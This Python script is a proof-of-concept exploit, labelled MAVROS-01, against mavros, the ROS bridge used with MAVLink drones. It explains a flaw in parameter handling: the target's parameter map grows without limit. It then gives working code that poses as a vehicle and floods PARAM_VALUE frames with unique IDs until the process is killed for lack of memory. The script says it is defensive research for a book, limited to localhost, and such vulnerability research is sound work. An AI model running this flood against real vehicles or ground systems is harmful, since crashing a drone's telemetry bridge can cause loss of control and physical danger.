#!/usr/bin/env python3
"""
poc_param_id_flood.py — PoC for MAVROS-01

Unbounded map growth via PARAM_VALUE.param_id -> RAM exhaustion DoS in mavros.

WHAT THIS DOES
--------------
A malicious vehicle (or a MITM on the telemetry link) streams PARAM_VALUE
messages with a UNIQUE 16-byte param_id every time, as fast as the link allows.

mavros' ParamPlugin::handle_param_value() (mavros/src/plugins/param.cpp) does
    parameters.emplace(param_id, Parameter(...))
UNCONDITIONALLY for every previously-unseen param_id, BEFORE the param_state
guard that distinguishes "we are actively pulling a list" from "unsolicited".
So the std::unordered_map<std::string, Parameter> `parameters` grows by one
entry for EVERY distinct param_id the attacker emits, even though mavros never
requested a parameter list. Each new insert also publishes a ROS
ParameterEvent on /<node>/parameter_events (and a mavros ParamEvent on
~/param/event), so the attack additionally amplifies into the ROS graph.

There is no cap (param_count is only used for log progress) and no eviction on
this path (parameters.clear() runs only on disconnect / a fresh pull), so RSS
climbs without bound -> the OS OOM-killer eventually terminates the mavros
process (DoS). On a constrained companion computer this is fast.

This is a BENIGN reproduction: it sends only well-formed PARAM_VALUE frames
(value 0.0, type REAL32) with random ids. It does not crash, corrupt, or
exfiltrate anything by itself; the only effect is memory/CPU growth in the
target you are authorized to test on localhost / bench.

USAGE
-----
    # default: bind a TCP server on 127.0.0.1:5760, mavros dials in
    #   (point mavros fcu_url at tcp://127.0.0.1:5760)
    python3 poc_param_id_flood.py --listen 127.0.0.1:5760

    # or push to a mavros that is a UDP server (fcu_url udp://:14555@):
    python3 poc_param_id_flood.py --udpout 127.0.0.1:14555

    # tuning:
    #   --count N     stop after N PARAM_VALUE frames   (default: unlimited)
    #   --rate HZ     cap send rate to HZ msgs/sec       (default: as fast as possible)
    #   --report N    print a progress line every N frames (default 5000)

This script is SELF-CONTAINED: it embeds its own minimal FakeVehicle harness
(see below) and has no dependency beyond pymavlink. No external import, no
other files required.

AUTHORIZATION: defensive research for a drone-security book. Localhost / bench
targets you own only.
"""
import os
import sys
import time
...
# ============================================================================
# Embedded minimal fake-vehicle harness — this PoC is SELF-CONTAINED
...
# (not wired to a CLI flag in this embedded copy; call _selftest() directly
# from a REPL/python -c if you need to re-verify the CRC_EXTRA tables.)
# ---------------------------------------------------------------------------
def _selftest():
...
def parse_args():
    p = argparse.ArgumentParser(description="MAVROS-01 PARAM_VALUE param_id map-growth DoS PoC")
    g = p.add_mutually_exclusive_group()
    g.add_argument("--listen", metavar="HOST:PORT", default="127.0.0.1:5760",
                   help="bind a TCP server mavros connects TO (default 127.0.0.1:5760)")
    g.add_argument("--udpout", metavar="HOST:PORT",
                   help="push to a mavros UDP server at HOST:PORT")
    g.add_argument("--connect", metavar="STR",
                   help="raw pymavlink connection string, used verbatim")
    p.add_argument("--sysid", type=int, default=1,
                   help="advertised system id; MUST equal mavros target_system_id (default 1)")
    p.add_argument("--compid", type=int, default=1, help="advertised component id (default 1)")
    p.add_argument("--count", type=int, default=0, help="stop after N frames (0 = unlimited)")
    p.add_argument("--rate", type=float, default=0.0, help="cap rate to HZ msgs/sec (0 = max)")
    p.add_argument("--report", type=int, default=5000, help="progress line every N frames")
    return p.parse_args()


def unique_param_id(n):
    """16 distinct ASCII bytes derived from a monotonically increasing counter.

    PARAM_VALUE.param_id is char[16]. We base-36 encode the counter and left-pad
    to 16 chars so EVERY frame carries a never-before-seen key -> a new map entry
    in mavros. (Random 16 bytes works too; a counter makes the run deterministic
    and guarantees no accidental collisions / dedup.)
    """
    ...
    while x:
        s = alphabet[x % 36] + s
        x //= 36
    return ("P" + s).rjust(16, "0")[:16]


def main():
    a = parse_args()
    banner("MAVROS-01 — PARAM_VALUE.param_id unbounded map growth (RAM exhaustion DoS)")
    ...
    v = FakeVehicle(conn, sysid=a.sysid, compid=a.compid)
    v.verbose = False  # silence per-frame harness logging; we print our own progress
    v.start()
    observe("link role: %s  (advertising sysid=%d — must match mavros target_system_id)"
            % (conn, a.sysid))
    if not v.wait_for_gcs(timeout=120):
        warn("no mavros connected; exiting")
        return 1

    attack("flooding PARAM_VALUE with unique 16-byte param_id; each one is a new "
           "map entry + a ParameterEvent in mavros")
    warn("watch the mavros RSS climb:  ps -o rss=,vsz=,comm= -p $(pgrep -f mavros_node)")

    interval = (1.0 / a.rate) if a.rate > 0 else 0.0
    sent = 0
    t0 = time.time()
    try:
        while a.count == 0 or sent < a.count:
            pid = unique_param_id(sent)
            # benign value/type; count/index are cosmetic on this path.
            v.send_param_value(pid, 0.0, count=65535, index=sent & 0xFFFF)
            sent += 1
            if a.report and sent % a.report == 0:
                dt = time.time() - t0
                rate = sent / dt if dt else 0.0
                observe("sent %d PARAM_VALUE frames (%.0f msg/s) — mavros map should now hold ~%d params"
                        % (sent, rate, sent))
            if interval:
                time.sleep(interval)
    except KeyboardInterrupt:
        ...
        dt = time.time() - t0
        ok("done: sent %d PARAM_VALUE frames in %.1fs (%.0f msg/s)"
           % (sent, dt, (sent / dt if dt else 0.0)))
        v.stop()
    return 0
